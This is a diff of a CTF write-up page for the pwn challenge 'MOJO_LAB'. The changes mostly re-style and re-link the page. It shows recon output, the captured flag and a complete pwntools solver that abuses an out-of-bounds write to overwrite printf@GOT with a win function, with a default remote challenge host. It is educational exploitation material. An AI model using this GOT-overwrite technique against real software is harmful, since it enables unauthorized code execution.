@@ -1,17 +1,17 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>MOJO_LAB · Pwn writeup — r3t0x</title><meta name="description" content="MOJO-JOJO CTF binary-exploitation writeup."><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/MOJO_LAB/"><meta property="og:type" content="article"><meta property="og:title" content="MOJO_LAB · Pwn writeup — r3t0x"><meta property="og:description" content="MOJO-JOJO CTF binary-exploitation writeup."><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/MOJO_LAB/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=c3965b3600e8"><link rel="stylesheet" href="/static/css/akatsuki.css?v=c3965b3600e8"><script src="/static/js/site.js?v=c3965b3600e8" defer></script></head><body class="veil-open">
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>MOJO_LAB · Pwn writeup — r3t0x</title><meta name="description" content="MOJO-JOJO CTF binary-exploitation writeup."><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/MOJO_LAB/"><meta property="og:type" content="article"><meta property="og:title" content="MOJO_LAB · Pwn writeup — r3t0x"><meta property="og:description" content="MOJO-JOJO CTF binary-exploitation writeup."><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/MOJO_LAB/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=b0b7e08b9fc0"><link rel="stylesheet" href="/static/css/akatsuki.css?v=b0b7e08b9fc0"><script src="/static/js/site.js?v=b0b7e08b9fc0" defer></script></head><body class="veil-open">
   <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
   <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
   <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
   <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
   <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><div class="route-veil" id="route-veil" aria-hidden="true"><div class="veil-lid veil-lid-top"></div><div class="veil-lid veil-lid-bottom"></div><div class="veil-eye"><svg viewBox="0 0 200 200"><defs><clipPath id="veilClip"><circle cx="100" cy="100" r="98"/></clipPath></defs><circle cx="100" cy="100" r="94" fill="var(--red)" stroke="#000" stroke-width="10"/><g class="veil-base"><circle cx="100" cy="100" r="90" fill="var(--red)"/><circle cx="100" cy="100" r="16" fill="#000"/><circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/><g class="veil-tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(120deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(240deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g></g><image class="veil-mangekyo" href="/static/img/mangekyou.png" x="0" y="0" width="200" height="200" clip-path="url(#veilClip)"/></svg></div></div><div class="kamui-veil" id="kamui-veil" aria-hidden="true"></div><main id="main"><article class="wrap article-page writeup-page">
-    <a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">← Back to the archive</a>
+    <a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a>
     <header class="article-heading"><p class="eyebrow">MOJO-JOJO CTF <span>/</span> Pwn WRITEUP</p><h1>MOJO_LAB</h1><p>MOJO-JOJO CTF binary-exploitation writeup.</p>
       <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>r3t0x</strong><small>2026-09-28 · archived challenge · hard</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
     </header>
     <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>MOJO-JOJO CTF</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>hard</span><span><small>POINTS</small>Archived</span></div>
     <div class="writeup-tags"><span>OOB Write + GOT Overwrite</span></div>
     <div class="article-layout">
-      <div class="prose writeup-prose"><h2 id="summary">Summary</h2><p class="lead">MOJO-JOJO CTF binary-exploitation writeup.</p><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
+      <div class="prose writeup-prose"><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
 <div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
 <span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
 <span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
@@ -43,75 +43,75 @@
 <div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="n">MOJO</span><span class="w"> </span><span class="n">JOJO</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="n">NOOOOO</span><span class="o">!</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">compromised</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">laboratory</span><span class="o">!</span>
 <span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
 <span class="n">MOJO</span><span class="o">-</span><span class="n">JOJO</span><span class="p">{</span><span class="n">m0j0_l4b_0wn3d</span><span class="p">}</span>
-</code></pre></div><h2 id="solver">Reference solver</h2><p>The complete solver used to validate the challenge:</p><pre><code class="language-python">from pwn import *
-import sys
+</code></pre></div><h2 id="solver">Reference solver</h2><p>The reference solver supplied with the writeup:</p><pre><code class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
 
-# Set context
-context.binary = binary = ELF('./main')
-context.log_level = 'info'
+<span class="hljs-comment"># Set context</span>
+context.binary = binary = ELF(<span class="hljs-string">&#x27;./main&#x27;</span>)
+context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>
 
-if args.REMOTE:
-    host = args.HOST or '4.233.210.175'
-    port = int(args.PORT or 9007)
+<span class="hljs-keyword">if</span> args.REMOTE:
+    host = args.HOST <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;4.233.210.175&#x27;</span>
+    port = <span class="hljs-built_in">int</span>(args.PORT <span class="hljs-keyword">or</span> <span class="hljs-number">9007</span>)
     p = remote(host, port)
-else:
-    p = process('./main')
+<span class="hljs-keyword">else</span>:
+    p = process(<span class="hljs-string">&#x27;./main&#x27;</span>)
 
-def get_menu():
-    p.recvuntil(b'&gt; ')
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_menu</span>():
+    p.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)
 
-def write_val(idx, val):
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">write_val</span>(<span class="hljs-params">idx, val</span>):
     get_menu()
-    p.sendline(b'1') # Modify DNA Sequence
-    p.recvuntil(b'DNA Slot Index: ')
-    # The Monkey Math: inverse the XOR to hit the target
-    p.sendline(str(idx ^ 0x7050).encode())
-    p.recvuntil(b'Base Pair Value: ')
-    p.sendline(str(val).encode())
-    p.recvuntil(b'[LAB]: DNA sequence updated successfully.\n')
+    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>) <span class="hljs-comment"># Modify DNA Sequence</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;DNA Slot Index: &#x27;</span>)
+    <span class="hljs-comment"># The Monkey Math: inverse the XOR to hit the target</span>
+    p.sendline(<span class="hljs-built_in">str</span>(idx ^ <span class="hljs-number">0x7050</span>).encode())
+    p.recvuntil(<span class="hljs-string">b&#x27;Base Pair Value: &#x27;</span>)
+    p.sendline(<span class="hljs-built_in">str</span>(val).encode())
+    p.recvuntil(<span class="hljs-string">b&#x27;[LAB]: DNA sequence updated successfully.\n&#x27;</span>)
 
-def trigger():
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger</span>():
     get_menu()
-    p.sendline(b'2') # Synthesize Chemical X
+    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>) <span class="hljs-comment"># Synthesize Chemical X</span>
 
-# Exploit Logic
-# 1. Target: printf@GOT
-# 2. Value: lab_win() address
-# 3. Primitive: 2-byte write via 'unsigned short' array
+<span class="hljs-comment"># Exploit Logic</span>
+<span class="hljs-comment"># 1. Target: printf@GOT</span>
+<span class="hljs-comment"># 2. Value: lab_win() address</span>
+<span class="hljs-comment"># 3. Primitive: 2-byte write via &#x27;unsigned short&#x27; array</span>
 
-# Note: In the new main.c, global names are chemical_x and dna_sequences
-got_printf = binary.got['printf']
-sym_dna = binary.symbols['dna_sequences']
-sym_win = binary.symbols['lab_win']
+<span class="hljs-comment"># Note: In the new main.c, global names are chemical_x and dna_sequences</span>
+got_printf = binary.got[<span class="hljs-string">&#x27;printf&#x27;</span>]
+sym_dna = binary.symbols[<span class="hljs-string">&#x27;dna_sequences&#x27;</span>]
+sym_win = binary.symbols[<span class="hljs-string">&#x27;lab_win&#x27;</span>]
 
-log.info(f&quot;printf@GOT: {hex(got_printf)}&quot;)
-log.info(f&quot;dna_sequences: {hex(sym_dna)}&quot;)
-log.info(f&quot;lab_win: {hex(sym_win)}&quot;)
+log.info(<span class="hljs-string">f&quot;printf@GOT: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(got_printf)}</span>&quot;</span>)
+log.info(<span class="hljs-string">f&quot;dna_sequences: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(sym_dna)}</span>&quot;</span>)
+log.info(<span class="hljs-string">f&quot;lab_win: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(sym_win)}</span>&quot;</span>)
 
-# Calculate start index
-# dna_sequences + i * 2 = got_printf =&gt; i = (got_printf - dna_sequences) / 2
-idx_start = (got_printf - sym_dna) // 2
-log.info(f&quot;Index start: {idx_start}&quot;)
+<span class="hljs-comment"># Calculate start index</span>
+<span class="hljs-comment"># dna_sequences + i * 2 = got_printf =&gt; i = (got_printf - dna_sequences) / 2</span>
+idx_start = (got_printf - sym_dna) // <span class="hljs-number">2</span>
+log.info(<span class="hljs-string">f&quot;Index start: <span class="hljs-subst">{idx_start}</span>&quot;</span>)
 
 chunks = [
-    (sym_win &gt;&gt; 0) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 16) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 32) &amp; 0xFFFF,
-    (sym_win &gt;&gt; 48) &amp; 0xFFFF
+    (sym_win &gt;&gt; <span class="hljs-number">0</span>) &amp; <span class="hljs-number">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xFFFF</span>,
+    (sym_win &gt;&gt; <span class="hljs-number">48</span>) &amp; <span class="hljs-number">0xFFFF</span>
 ]
 
-p.recvuntil(b'Input your Chemical X formula: ')
-p.sendline(b&quot;HELLO-MOJO&quot;) # Initial formula
+p.recvuntil(<span class="hljs-string">b&#x27;Input your Chemical X formula: &#x27;</span>)
+p.sendline(<span class="hljs-string">b&quot;HELLO-MOJO&quot;</span>) <span class="hljs-comment"># Initial formula</span>
 
-for i, chunk in enumerate(chunks):
-    log.info(f&quot;Writing chunk {i}: {hex(chunk)} at idx {idx_start + i}&quot;)
+<span class="hljs-keyword">for</span> i, chunk <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chunks):
+    log.info(<span class="hljs-string">f&quot;Writing chunk <span class="hljs-subst">{i}</span>: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(chunk)}</span> at idx <span class="hljs-subst">{idx_start + i}</span>&quot;</span>)
     write_val(idx_start + i, chunk)
 
-log.info(&quot;Triggering synthesized formula...&quot;)
+log.info(<span class="hljs-string">&quot;Triggering synthesized formula...&quot;</span>)
 trigger()
 
 p.interactive()</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>MOJO-JOJO{m0j0_l4b_0wn3d}</code></pre>
-      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">More MOJO-JOJO CTF writeups ↗</a></div></div>
+      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a></div></div>
     </div>
   </article></main>
   <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
